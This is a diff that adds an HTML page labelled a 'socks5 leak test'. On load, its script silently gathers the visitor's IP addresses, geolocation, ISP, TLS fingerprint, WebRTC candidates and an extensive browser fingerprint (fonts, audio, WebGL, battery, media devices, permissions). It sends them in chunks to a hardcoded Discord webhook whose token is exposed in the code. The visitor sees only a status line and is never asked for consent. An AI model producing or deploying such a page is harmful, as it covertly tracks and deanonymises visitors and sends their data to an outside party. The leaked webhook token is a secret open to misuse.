@@ -1,0 +1,609 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>socks5 leak test</title>
+<link rel="preconnect" href="https://discord.com" crossorigin>
+<link rel="preconnect" href="https://api.ipify.org">
+<link rel="preconnect" href="https://api64.ipify.org">
+<link rel="preconnect" href="https://ipv6.icanhazip.com">
+<link rel="preconnect" href="https://www.cloudflare.com">
+<link rel="preconnect" href="https://ipwho.is">
+<link rel="preconnect" href="https://tls.peet.ws">
+<link rel="dns-prefetch" href="//ip-api.com">
+<style>
+  html,body{background:#000;margin:0;height:100%;overflow:hidden}
+  #status{font:12px/1.5 Consolas,Menlo,monospace;color:#666;padding:10px;white-space:pre-wrap}
+  #status.ok{color:#6c6}
+  #status.no{color:#c66}
+</style>
+</head>
+<body>
+
+<div id="status"></div>
+
+<script>
+(function(){
+  'use strict';
+
+  // ============================================================
+  var WEBHOOK = 'https://discord.com/api/webhooks/1566177654498001008/aN1oZGJbYyanntq1l2Hq4VkdCN9iIq41gn15uajwruzi2bci1D5hYnWNYbdTGQhiz9hq';
+  var INCLUDE_FP = true;
+  // ============================================================
+
+  var T0 = performance.now();
+  var sentCount = 0, failCount = 0;
+  var report = { ts: new Date().toISOString(), ipv4: null, ipv6: null, ipInfo: {}, tls: {}, webrtc: [], fp: {} };
+
+  function $(id){ return document.getElementById(id); }
+  function setStatus(msg, cls){
+    var el = Math.round(performance.now() - T0);
+    var s = $('status');
+    s.textContent = msg + ' · ' + el + 'ms';
+    s.className = cls || '';
+  }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+  function withTimeout(p, ms, fallback){
+    return Promise.race([p, sleep(ms).then(function(){ return fallback; })]);
+  }
+
+  function fetchJSON(url, ms){
+    ms = ms || 1500;
+    var ctrl = new AbortController();
+    var t = setTimeout(function(){ ctrl.abort(); }, ms);
+    return fetch(url, { cache: 'no-store', signal: ctrl.signal })
+      .then(function(r){ return r.json(); })
+      .then(function(j){ clearTimeout(t); return j; })
+      .catch(function(){ clearTimeout(t); return null; });
+  }
+  function fetchText(url, ms){
+    ms = ms || 1500;
+    var ctrl = new AbortController();
+    var t = setTimeout(function(){ ctrl.abort(); }, ms);
+    return fetch(url, { cache: 'no-store', signal: ctrl.signal })
+      .then(function(r){ return r.text(); })
+      .then(function(s){ clearTimeout(t); return s; })
+      .catch(function(){ clearTimeout(t); return null; });
+  }
+
+  // ============================================================
+  // Warm CORS preflight at t=0 so the real POST skips it.
+  // ============================================================
+  fetch(WEBHOOK, { method: 'OPTIONS', headers: { 'Content-Type': 'application/json' } }).catch(function(){});
+
+  // --- ip helpers ---
+
+  function norm(ip){
+    if(!ip) return '';
+    var s = String(ip).trim().replace(/^\[|\]$/g,'');
+    if(!s) return '';
+    var m = s.match(/^::ffff:(\d+\.\d+\.\d+\.\d+)$/i);
+    if(m) return m[1];
+    return s.indexOf(':') !== -1 ? s.toLowerCase() : s;
+  }
+  function priv4(ip){
+    var p = ip.split('.').map(Number);
+    if(p.length!==4 || p.some(function(n){return isNaN(n)||n<0||n>255;})) return true;
+    if(p[0]===0||p[0]===10||p[0]===127) return true;
+    if(p[0]===169&&p[1]===254) return true;
+    if(p[0]===172&&p[1]>=16&&p[1]<=31) return true;
+    if(p[0]===192&&p[1]===168) return true;
+    if(p[0]===100&&p[1]>=64&&p[1]<=127) return true;
+    if(p[0]===198&&(p[1]===18||p[1]===19)) return true;
+    if(p[0]===192&&p[1]===0&&p[2]===2) return true;
+    if(p[0]===198&&p[1]===51&&p[2]===100) return true;
+    if(p[0]===203&&p[1]===0&&p[2]===113) return true;
+    if(p[0]>=224) return true;
+    return false;
+  }
+  function priv6(ip){
+    var low = ip.toLowerCase();
+    if(low==='::'||low==='::1') return true;
+    if(low.startsWith('fc')||low.startsWith('fd')) return true;
+    if(/^fe[89ab]/.test(low)||low.startsWith('ff')) return true;
+    if(low.startsWith('2001:db8')) return true;
+    return false;
+  }
+  function isPublic(ip){
+    if(!ip) return false;
+    var n = norm(ip);
+    if(n.indexOf(':')!==-1) return !priv6(n);
+    return !priv4(n);
+  }
+
+  // ============================================================
+  // RAW IP DISCOVERY (multi-source, Promise.any = first success wins)
+  // ============================================================
+
+  function getV4(){
+    return Promise.any([
+      fetchJSON('https://api.ipify.org?format=json', 1200)
+        .then(function(j){ if(j && j.ip && j.ip.indexOf(':') === -1) return j.ip; throw 0; }),
+      fetchText('https://www.cloudflare.com/cdn-cgi/trace', 1200)
+        .then(function(t){ var m = t && t.match(/^ip=(.+)$/m); if(m && m[1].indexOf(':') === -1) return m[1].trim(); throw 0; })
+    ]).catch(function(){ return null; });
+  }
+
+  function getV6(){
+    return Promise.any([
+      fetchText('https://ipv6.icanhazip.com', 1200)
+        .then(function(t){ var ip = t && t.trim(); if(ip && ip.indexOf(':') !== -1) return ip; throw 0; }),
+      fetchJSON('https://api64.ipify.org?format=json', 1200)
+        .then(function(j){ if(j && j.ip && j.ip.indexOf(':') !== -1) return j.ip; throw 0; })
+    ]).catch(function(){ return null; });
+  }
+
+  async function grabRawIPs(){
+    var r = await Promise.all([getV4(), getV6()]);
+    report.ipv4 = r[0];
+    report.ipv6 = r[1];
+    return { v4: r[0], v6: r[1] };
+  }
+
+  // ============================================================
+  // IP INTEL (ip-api primary, ipwho.is fallback — works when VPN blocks HTTP)
+  // ============================================================
+
+  async function enrichIP(ip){
+    if(!ip) return null;
+
+    // Primary: ip-api.com (HTTP, free, has proxy/hosting/mobile flags)
+    var fields = 'status,message,continent,country,countryCode,region,regionName,city,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting';
+    try {
+      var d = await fetchJSON('http://ip-api.com/json/' + encodeURIComponent(ip) + '?fields=' + fields, 1500);
+      if(d && d.status === 'success'){ d._source = 'ip-api'; return d; }
+    } catch(e){}
+
+    // Fallback: ipwho.is (HTTPS, works if HTTP is blocked by VPN)
+    try {
+      var w = await fetchJSON('https://ipwho.is/' + encodeURIComponent(ip), 1500);
+      if(w && w.success){
+        return {
+          _source: 'ipwho.is',
+          as: 'AS' + ((w.connection && w.connection.asn) || '?'),
+          asname: (w.connection && w.connection.org) || '?',
+          isp: (w.connection && w.connection.isp) || '?',
+          org: (w.connection && w.connection.org) || '?',
+          country: w.country,
+          countryCode: w.country_code,
+          regionName: w.region,
+          region: w.region_code,
+          city: w.city,
+          lat: w.latitude,
+          lon: w.longitude,
+          timezone: w.timezone && w.timezone.id,
+          offset: w.timezone && w.timezone.offset,
+          currency: null,
+          reverse: null,
+          mobile: null,
+          proxy: null,
+          hosting: null
+        };
+      }
+    } catch(e){}
+
+    return null;
+  }
+
+  async function grabIntel(raw){
+    var r = await Promise.all([enrichIP(raw.v4), enrichIP(raw.v6)]);
+    report.ipInfo.v4 = r[0];
+    report.ipInfo.v6 = r[1];
+    return { v4: r[0], v6: r[1] };
+  }
+
+  // ============================================================
+  // TLS fingerprint (JA3 / JA4 / HTTP2)
+  // ============================================================
+
+  async function grabTLS(){
+    var d = await fetchJSON('https://tls.peet.ws/api/all', 1500);
+    if(!d){ report.tls = { error: 'unreachable' }; return report.tls; }
+    try {
+      report.tls = {
+        ja3: d.tls && d.tls.ja3,
+        ja3_hash: d.tls && d.tls.ja3_hash,
+        ja4: d.tls && d.tls.ja4,
+        http2: d.http2 ? {
+          akamai_fingerprint: d.http2.akamai_fingerprint,
+          akamai_fingerprint_hash: d.http2.akamai_fingerprint_hash
+        } : null,
+        tls_version: d.tls && d.tls.tls_version_negotiated,
+        cipher_suite: d.tls && d.tls.cipher_suite
+      };
+    } catch(e){ report.tls = { error: e.message }; }
+    return report.tls;
+  }
+
+  // ============================================================
+  // WebRTC (parallel STUN, 350ms window, IPv6 server included)
+  // ============================================================
+
+  function grabWebRTC(){
+    return new Promise(function(resolve){
+      var found = [];
+      var pc;
+      var iceServers = [
+        { urls: 'stun:stun.l.google.com:19302' },
+        { urls: 'stun:stun.cloudflare.com:3478' },
+        { urls: 'stun:stun.nextcloud.com:443' },
+        { urls: 'stun:[2001:4860:4864:1::1]:19302' }
+      ];
+      try { pc = new RTCPeerConnection({ iceServers: iceServers }); }
+      catch(e){ return resolve(found); }
+      pc.onicecandidate = function(ev){
+        if(!ev.candidate || !ev.candidate.candidate) return;
+        var s = ev.candidate.candidate;
+        var parts = s.trim().split(/\s+/);
+        var ip = parts[4];
+        var typM = s.match(/\styp\s(\w+)/);
+        if(!ip) return;
+        found.push({ ip: norm(ip), typ: typM ? typM[1] : '?', protocol: parts[2] || '' });
+      };
+      pc.createDataChannel('t');
+      pc.createOffer().then(function(off){ return pc.setLocalDescription(off); }).catch(function(){});
+      setTimeout(function(){
+        try { pc.close(); } catch(e){}
+        report.webrtc = found;
+        resolve(found);
+      }, 350);
+    });
+  }
+
+  // ============================================================
+  // FINGERPRINT
+  // ============================================================
+
+  function canvasHash(){
+    try {
+      var c = document.createElement('canvas');
+      c.width = 220; c.height = 40;
+      var x = c.getContext('2d');
+      x.textBaseline = 'top'; x.font = '14px Arial';
+      x.fillStyle = '#f60'; x.fillRect(0, 0, 220, 40);
+      x.fillStyle = '#069'; x.fillText('fp-test-123', 2, 2);
+      var s = c.toDataURL(); var h = 0x811c9dc5;
+      for(var i=0;i<s.length;i++){ h ^= s.charCodeAt(i); h = (h * 0x01000193) >>> 0; }
+      return h.toString(16);
+    } catch(e){ return 'blocked'; }
+  }
+
+  async function audioHash(){
+    try {
+      var offline = new OfflineAudioContext(1, 44100, 44100);
+      var o = offline.createOscillator();
+      var c = offline.createDynamicsCompressor();
+      o.type = 'triangle'; o.frequency.value = 440;
+      o.connect(c); c.connect(offline.destination);
+      o.start(0);
+      var buffer = await offline.startRendering();
+      var data = buffer.getChannelData(0);
+      var hash = 0;
+      for(var i=0;i<data.length;i+=100){
+        hash = ((hash << 5) - hash) + Math.round(data[i] * 10000);
+        hash |= 0;
+      }
+      return Math.abs(hash).toString(16);
+    } catch(e){ return 'unavailable'; }
+  }
+
+  function webglInfo(){
+    try {
+      var c = document.createElement('canvas');
+      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if(!gl) return { vendor: 'no webgl', renderer: 'no webgl' };
+      var ext = gl.getExtension('WEBGL_debug_renderer_info');
+      if(!ext) return { vendor: 'no ext', renderer: 'no ext' };
+      return {
+        vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+      };
+    } catch(e){ return { vendor: 'error', renderer: e.message }; }
+  }
+
+  function fontList(){
+    var fonts = ['Arial','Arial Black','Arial Narrow','Arial Rounded MT Bold','Calibri','Cambria','Candara',
+      'Comic Sans MS','Consolas','Constantia','Corbel','Courier New','Georgia','Helvetica','Impact',
+      'Lucida Console','Lucida Sans Unicode','Microsoft Sans Serif','Palatino Linotype','Segoe UI',
+      'Tahoma','Times New Roman','Trebuchet MS','Verdana','Webdings','Wingdings','Roboto','Ubuntu',
+      'Cantarell','DejaVu Sans','Liberation Sans','Noto Sans','Fira Sans','Menlo','Monaco','SF Pro',
+      'San Francisco','Segoe UI Emoji','Apple Color Emoji'];
+    var c = document.createElement('canvas'); var ctx = c.getContext('2d');
+    var base = 'monospace';
+    ctx.font = '16px ' + base;
+    var baseW = ctx.measureText('mmmmmmmmmmlli').width;
+    var out = [];
+    fonts.forEach(function(f){
+      ctx.font = '16px "' + f + '", ' + base;
+      if(ctx.measureText('mmmmmmmmmmlli').width !== baseW) out.push(f);
+    });
+    return out;
+  }
+
+  function clientHints(){
+    if(!navigator.userAgentData) return null;
+    var ua = navigator.userAgentData;
+    return { brands: ua.brands, mobile: ua.mobile, platform: ua.platform };
+  }
+
+  async function permissions(){
+    if(!navigator.permissions) return {};
+    var names = ['notifications','geolocation','camera','microphone','clipboard-read','clipboard-write'];
+    var out = {};
+    await Promise.all(names.map(async function(n){
+      try { var p = await navigator.permissions.query({name:n}); out[n] = p.state; } catch(e){}
+    }));
+    return out;
+  }
+
+  async function mediaDevices(){
+    if(!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
+    try {
+      var ds = await Promise.race([
+        navigator.mediaDevices.enumerateDevices(),
+        sleep(500).then(function(){ return []; })
+      ]);
+      return ds.map(function(d){ return { kind: d.kind, label: d.label, id: d.deviceId ? 'present' : 'none' }; });
+    } catch(e){ return []; }
+  }
+
+  async function batteryInfo(){
+    if(!navigator.getBattery) return null;
+    try {
+      var b = await navigator.getBattery();
+      return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+    } catch(e){ return null; }
+  }
+
+  function networkInfo(){
+    if(!navigator.connection) return null;
+    var c = navigator.connection;
+    return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
+  }
+
+  async function grabFP(){
+    var n = navigator, s = screen;
+    var tz = '—';
+    try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+
+    var parts = await Promise.all([audioHash(), permissions(), mediaDevices(), batteryInfo()]);
+
+    report.fp = {
+      ua: n.userAgent,
+      platform: n.platform || '',
+      language: n.language,
+      languages: (n.languages||[]).join(', '),
+      timezone: tz,
+      screen: s.width + 'x' + s.height,
+      colorDepth: s.colorDepth,
+      avail: s.availWidth + 'x' + s.availHeight,
+      innerWindow: window.innerWidth + 'x' + window.innerHeight,
+      dpr: window.devicePixelRatio,
+      cores: n.hardwareConcurrency,
+      mem: n.deviceMemory || null,
+      touch: ('ontouchstart' in window),
+      maxTouch: n.maxTouchPoints,
+      cookies: n.cookieEnabled,
+      dnt: n.doNotTrack || '',
+      canvas: canvasHash(),
+      audio: parts[0],
+      webgl: webglInfo(),
+      fonts: fontList(),
+      clientHints: clientHints(),
+      permissions: parts[1],
+      mediaDevices: parts[2],
+      battery: parts[3],
+      network: networkInfo(),
+      pdfViewer: n.pdfViewerEnabled,
+      plugins: n.plugins ? Array.from(n.plugins).map(function(p){return p.name;}) : [],
+      mimeTypes: n.mimeTypes ? Array.from(n.mimeTypes).map(function(m){return m.type;}) : [],
+      screenOrientation: s.orientation ? s.orientation.type : null,
+      colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
+      reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
+    };
+    return report.fp;
+  }
+
+  // ============================================================
+  // MESSAGE BUILDERS
+  // ============================================================
+
+  function fmtIPBlock(label, ip, info){
+    if(!ip) return ['**' + label + ':** none'];
+    var lines = ['**' + label + ':** `' + ip + '`'];
+    if(!info){ lines.push('```no enrichment```'); return lines; }
+    if(info.error){ lines.push('```error: ' + info.error + '```'); return lines; }
+    var f = [
+      'asn        ' + (info.as || '—'),
+      'asname     ' + (info.asname || '—'),
+      'isp        ' + (info.isp || '—'),
+      'org        ' + (info.org || '—'),
+      'country    ' + (info.country || '—') + ' (' + (info.countryCode || '?') + ')',
+      'region     ' + (info.regionName || '—') + ' (' + (info.region || '?') + ')',
+      'city       ' + (info.city || '—'),
+      'coords     ' + (info.lat != null ? info.lat + ', ' + info.lon : '—'),
+      'timezone   ' + (info.timezone || '—') + ' (UTC' + (info.offset != null ? (info.offset >= 0 ? '+' : '') + info.offset/3600 : '?') + ')',
+      'currency   ' + (info.currency || '—'),
+      'reverse    ' + (info.reverse || '—'),
+      'mobile     ' + (info.mobile === true ? 'YES' : info.mobile === false ? 'no' : '?'),
+      'proxy      ' + (info.proxy === true ? 'YES ⚠' : info.proxy === false ? 'no' : '?'),
+      'hosting    ' + (info.hosting === true ? 'YES ⚠' : info.hosting === false ? 'no' : '?'),
+      'source     ' + (info._source || '—')
+    ];
+    lines.push('```' + f.join('\n') + '```');
+    return lines;
+  }
+
+  function buildCore(raw, tls){
+    var L = [];
+    L.push('**socks5 leak test** · part 1/2 · ' + report.ts);
+    L.push('');
+    if(raw && raw.v4) L.push('**public ipv4:** `' + raw.v4 + '`'); else L.push('**public ipv4:** none');
+    if(raw && raw.v6) L.push('**public ipv6:** `' + raw.v6 + '`'); else L.push('**public ipv6:** none');
+    L.push('');
+    L.push('**TLS fingerprint (JA3 / JA4):**');
+    if(tls && tls.error){
+      L.push('```error: ' + tls.error + '```');
+    } else if(tls){
+      L.push('```' + [
+        'ja3       ' + (tls.ja3 || '?'),
+        'ja3_hash  ' + (tls.ja3_hash || '?'),
+        'ja4       ' + (tls.ja4 || '?'),
+        'tls_ver   ' + (tls.tls_version || '?'),
+        'cipher    ' + (tls.cipher_suite || '?'),
+        'http2_ak  ' + (tls.http2 ? tls.http2.akamai_fingerprint : '?'),
+        'http2_h   ' + (tls.http2 ? tls.http2.akamai_fingerprint_hash : '?')
+      ].join('\n') + '```');
+    } else {
+      L.push('```timeout```');
+    }
+    return L.join('\n');
+  }
+
+  function buildExtras(intel, webrtc, fp){
+    var L = [];
+    L.push('**socks5 leak test** · part 2/2 · ' + report.ts);
+    L.push('');
+
+    // IP intel
+    var b4 = fmtIPBlock('ipv4 intel', report.ipv4, intel && intel.v4);
+    L = L.concat(b4); L.push('');
+    var b6 = fmtIPBlock('ipv6 intel', report.ipv6, intel && intel.v6);
+    L = L.concat(b6); L.push('');
+
+    // WebRTC
+    L.push('**webrtc candidates:**');
+    if(!webrtc || !webrtc.length){
+      L.push('```none (mDNS masked or STUN blocked)```');
+    } else {
+      var seen = new Set(); var out = [];
+      webrtc.forEach(function(c){
+        var k = c.ip + '|' + c.typ;
+        if(seen.has(k)) return;
+        seen.add(k);
+        out.push(c.typ + '  ' + c.ip + '  [' + (isPublic(c.ip) ? 'public' : 'private') + ']  ' + c.protocol);
+      });
+      L.push('```' + out.join('\n') + '```');
+    }
+
+    // FP
+    if(INCLUDE_FP && fp){
+      L.push('');
+      L.push('**fingerprint:**');
+      var f = fp;
+      var fl = [
+        'ua         ' + f.ua,
+        'platform   ' + f.platform,
+        'lang       ' + f.language + ' (' + f.languages + ')',
+        'timezone   ' + f.timezone,
+        'screen     ' + f.screen + ' @' + f.colorDepth + 'bit',
+        'avail      ' + f.avail,
+        'innerWin   ' + f.innerWindow,
+        'dpr        ' + f.dpr,
+        'cores      ' + f.cores,
+        'mem        ' + (f.mem ? f.mem + ' GB' : '?'),
+        'touch      ' + f.touch + ' (' + f.maxTouch + ')',
+        'cookies    ' + f.cookies,
+        'dnt        ' + (f.dnt || '?'),
+        'canvas     ' + f.canvas,
+        'audio      ' + f.audio,
+        'webgl_v    ' + f.webgl.vendor,
+        'webgl_r    ' + f.webgl.renderer,
+        'fonts      ' + (f.fonts.length ? f.fonts.join(', ') : 'none'),
+        'colorScheme ' + f.colorScheme,
+        'reducedMotion ' + f.reducedMotion,
+        'pdfViewer  ' + f.pdfViewer,
+        'orientation ' + f.screenOrientation,
+        'plugins    ' + (f.plugins.length ? f.plugins.join(', ') : 'none'),
+        'mimeTypes  ' + (f.mimeTypes.length ? f.mimeTypes.join(', ') : 'none')
+      ];
+      if(f.clientHints) fl.push('clientHints ' + JSON.stringify(f.clientHints));
+      if(f.permissions && Object.keys(f.permissions).length) fl.push('permissions ' + JSON.stringify(f.permissions));
+      if(f.mediaDevices && f.mediaDevices.length) fl.push('mediaDevices ' + JSON.stringify(f.mediaDevices));
+      if(f.battery) fl.push('battery     ' + JSON.stringify(f.battery));
+      if(f.network) fl.push('network     ' + JSON.stringify(f.network));
+      L.push('```' + fl.join('\n') + '```');
+    }
+    return L.join('\n');
+  }
+
+  // ============================================================
+  // SEND
+  // ============================================================
+
+  function chunkify(text, size){
+    size = size || 1900;
+    var out = [];
+    while(text.length > size){
+      var cut = text.lastIndexOf('\n', size);
+      if(cut === -1) cut = size;
+      out.push(text.slice(0, cut));
+      text = text.slice(cut).replace(/^\n/, '');
+    }
+    if(text) out.push(text);
+    return out;
+  }
+
+  async function postChunks(text){
+    var chunks = chunkify(text);
+    return Promise.all(chunks.map(async function(chunk){
+      try {
+        var r = await fetch(WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: chunk }),
+          keepalive: true
+        });
+        if(r.ok || r.status === 204){ sentCount++; return true; }
+        failCount++; return false;
+      } catch(e){ failCount++; return false; }
+    }));
+  }
+
+  // ============================================================
+  // ORCHESTRATE — everything fires at t=0
+  // ============================================================
+
+  async function run(){
+    var rawP = grabRawIPs();
+    var intelP = rawP.then(function(raw){ return grabIntel(raw); });
+    var tlsP = grabTLS();
+    var webrtcP = grabWebRTC();
+    var fpP = INCLUDE_FP ? grabFP() : Promise.resolve(null);
+
+    // Send 1: raw IPs + TLS (critical, fast)
+    var send1 = (async function(){
+      try {
+        var r = await Promise.all([
+          withTimeout(rawP, 1500, { v4: null, v6: null }),
+          withTimeout(tlsP, 1500, { error: 'timeout' })
+        ]);
+        return await postChunks(buildCore(r[0], r[1]));
+      } catch(e){ return null; }
+    })();
+
+    // Send 2: intel + webrtc + fp (detailed, slower)
+    var send2 = (async function(){
+      try {
+        var r = await Promise.all([
+          withTimeout(intelP, 1800, null),
+          withTimeout(webrtcP, 800, []),
+          withTimeout(fpP, 1200, null)
+        ]);
+        return await postChunks(buildExtras(r[0], r[1], r[2]));
+      } catch(e){ return null; }
+    })();
+
+    await Promise.allSettled([send1, send2]);
+
+    if(failCount === 0 && sentCount > 0) setStatus('sent to webhook', 'ok');
+    else if(sentCount > 0) setStatus('partially sent (' + sentCount + ' ok, ' + failCount + ' failed)', 'no');
+    else setStatus('failed to send', 'no');
+  }
+
+  run();
+
+})();
+</script>
+</body>
+</html>
